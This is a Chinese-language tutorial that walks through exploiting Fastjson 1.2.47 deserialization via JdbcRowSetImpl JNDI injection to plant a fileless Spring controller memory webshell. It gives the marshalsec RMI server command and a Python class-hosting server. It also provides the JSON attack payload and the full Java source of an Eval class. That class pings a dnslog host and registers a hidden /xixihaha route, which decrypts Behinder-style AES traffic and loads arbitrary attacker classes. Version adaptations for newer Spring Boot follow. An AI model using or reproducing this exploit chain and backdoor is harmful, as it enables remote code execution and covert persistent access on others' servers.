## **Fastjson注入SpringController内存马**
这里要用JdbcRowSetImpl打lookup的JNDI注入。

fastjson1.83能dns出网，但不能利用
>但是以上payload只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。这是很多新手，误以为能DNS出网，就认为存在fastjson漏洞，这是不正确的。

其实，会发现，这个FastJson版本，并不能利用，只能打打DNS。

这里把版本改成1.2.47。开个RMI服务，打入payload。请求有了，但是代码没有执行。这里有以下几种情况，代码是执行不了的。

> 1、把Java编译成class的时候Java版本A     和目标极其运行的Java版本B   ，两个Java版本不同，导致失败
>
> 2、不仅FastJson要满足对应版本，jdk也要满足对应版本
>
> 3、编译的时候eval.java 不能有package


^
## **流程**
1、代码写好build，生成Eval.class
2、我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类Eval.class
```
python3  -m http.server 8080
同目录放Eval.class
```
RMI转发到8080
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx:8000/#Eval" 9999
```
3、打入
```
payload
{
    {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}, 
        {
          "@type":"com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName":"rmi://xxx.xx:9999/EvalCode",
          "autoCommit":false
        }
}
```
4、连接内存马的路由/xixihaha ，冰蝎，直接访问url可能404。


## **代码**
核心就是拿到request、response、session，从3.0开始，只需要把这三个封装到map中，传到冰蝎客户端就行了。

```
import org.springframework.beans.factory.InitializingBean;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.sound.midi.Soundbank;
import java.io.IOException;
import java.lang.reflect.Method;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Email:
 * @description:
 * @Version
 * @create 2023-10-28 13:37
 */
public class Eval extends java.lang.ClassLoader {


    public Eval() {

        Runtime runtime = Runtime.getRuntime();
        Process pc = null;
        try {
            pc = runtime.exec("ping", new String[]{"-c 4", "c3e3sc.dnslog.cn"});
            pc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }


        System.out.println("开始.....");
        java.lang.reflect.Field filed = null;
        try {
            filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        filed.setAccessible(true);
        WebApplicationContext context = null;
        try {
            context = (WebApplicationContext) ((java.util.LinkedHashSet) filed.get(null)).iterator().next();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        System.out.println("获取 WebApplicationContext 成功");
        // 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean

        RequestMappingHandlerMapping handlerMapping = null;

        try {

//       handlerMapping = context.getBean(RequestMappingHandlerMapping.class);

            // 获取所有的 bean 对象
            Map<String, Object> beans = context.getBeansOfType(Object.class);
//       // 遍历所有的 bean 对象
            for (Map.Entry<String, Object> entry : beans.entrySet()) {
                String beanName = entry.getKey();
                Object beanInstance = entry.getValue();

                // 在这里处理每个 bean 对象，可以输出 bean 的名称或执行其他操作
//         System.out.println("Bean Name: " + beanName);
//         System.out.println("Bean Class: " + beanInstance.getClass().getName());
                if ("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping".equals(beanInstance.getClass().getName())) {
                    handlerMapping = (RequestMappingHandlerMapping) beanInstance;
                    break;
                }
            }

        } catch (Exception e) {
            System.out.println(handlerMapping);
            System.out.println(e);
        }
        System.out.println("获取 RequestMappingHandlerMapping 的实例 bean ");
        // 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = null;
        try {
            method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        // 属性被 private 修饰，所以 setAccessible true
        method.setAccessible(true);
        System.out.println("初始化 AbstractHandlerMethodMapping 的 getMappingRegistry 方法完成");

        // 通过反射获得该类的cmd方法
        Method method2 = null;
        try {
            method2 = Eval.class.getMethod("cmd");
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        // 定义该controller的path
        PatternsRequestCondition url = new PatternsRequestCondition("/xixihaha");
        // 定义允许访问的HTTP方法
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，避免无限循环使用另一个构造方法
        Eval injectToController = new Eval(null);
        // 将该controller注册到Spring容器
        handlerMapping.registerMapping(info, injectToController, method2);

    }

    Eval(java.lang.ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        // 调用父类的defineClass函数 , 相当于自定义加载类
        //这句代码将返回一个 java.lang.Class 对象。这个类对象表示通过字节数组 b 中的类文件数据动态加载的类。
        // defineClass 方法用于将二进制数据转换为类的实例。
        return super.defineClass(b, 0, b.length);
    }

    // 处理远程命令执行请求
    public void cmd() {
        HttpServletRequest request = null;
        HttpServletResponse response = null;
        try {
            request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        } catch (Exception e) {
            System.out.println("Get __ request Error ");
            System.out.println("Get __ response Error ");
            System.out.println(e);
        }

        //注入冰蝎
        if (request.getMethod().equals("POST")) {

            HttpSession session = request.getSession();


            String k = "0945fc9611f55fd0e183fb8b044f1afe".substring(0, 16);/*该密钥为连接密码32位md5值的前16位，连接密码nopass*/
            session.putValue("u", k);
            Cipher c = null;
            try {
                c = Cipher.getInstance("AES");
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (NoSuchPaddingException e) {
                e.printStackTrace();
            }
            try {
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            } catch (InvalidKeyException e) {
                e.printStackTrace();
            }

            HashMap<Object, Object> pageContext = new HashMap<>();
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            try {
                new Eval(this.getClass().getClassLoader())

                        //调用方法g 加载一个类
                        .g(
                                c.doFinal(
                                        //sun.misc.BASE64Decoder 类被用于解码 HTTP POST 请求中的数据，
                                        // 该数据经过 BASE64 编码。这个操作通常在服务器端用于处理客户端传递的数据，
                                        // 尤其是在需要进行数据解密或还原时。
                                        new sun.misc.BASE64Decoder()
                                                .decodeBuffer(request.getReader().readLine())))
                        //调用完g 加载一个类，调用newInstance() 后 ,相当于new
                        .newInstance().equals(pageContext);
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (IllegalBlockSizeException e) {
                e.printStackTrace();
            } catch (BadPaddingException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }


}
```
此方式理论支持springboot 2.6.x 以上和以下版本，具体自测。
因为springboot 2.6.x 以上最近版本添加了 pathPatternsCondition ，以往的手动注册方式会导致任意请求提示。
注册Controller后，访问具体的路径的时候可能出现了如下问题：
```
java.lang.IllegalArgumentException: Expected lookupPath in request attribute"org.springframework.web.util.UrlPathHelper.PATH".
```

获取context方式，在springboot3.0以上不适用，不如直接：
```
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE,0);
```
RequestMappingInfo获取方式也可以修改下，更好适配。
```
        Field configField = null;
        try {
            configField = mapping.getClass().getDeclaredField("config");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config =
                null;
        try {
            config = (RequestMappingInfo.BuilderConfiguration) configField.get(mapping);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }

        RequestMappingInfo info = RequestMappingInfo.paths("/evil")
                .options(config)
                .build();
```
javax换jakarta，也可能会。




